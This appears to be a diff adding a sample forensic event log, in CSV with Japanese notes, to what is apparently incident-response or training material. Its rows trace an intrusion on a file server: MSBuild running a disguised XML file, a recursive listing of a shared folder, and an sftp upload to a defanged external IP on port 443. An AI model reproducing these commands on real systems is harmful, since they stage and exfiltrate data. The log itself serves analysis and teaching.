@@ -1,0 +1,4 @@
+timestamp,timezone,host,event_type,user,process,command_line,dst,dst_port,bytes_out,bytes_in,notes
+2025-05-11 01:44:09,JST,FS01,process,SAMPLE\Administrator,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe,"MSBuild.exe C:\ProgramData\Microsoft\UIAnimation.xml",,,,,"MSBuildによるUIAnimation.xml実行"
+2025-05-17 20:05:12,JST,FS01,process,SAMPLE\Administrator,cmd.exe,"cmd.exe /c dir D:\Share /s /a > C:\ProgramData\Microsoft\fs01_dir_20250517.txt",,,,,"共有フォルダ配下のファイル一覧作成"
+2025-05-18 00:13:27,JST,FS01,process,SAMPLE\Administrator,sftp.exe,"sftp.exe -P 443 upload@45[.]77[.]183[.]161",45[.]77[.]183[.]161,443,,,"SFTPクライアント実行"
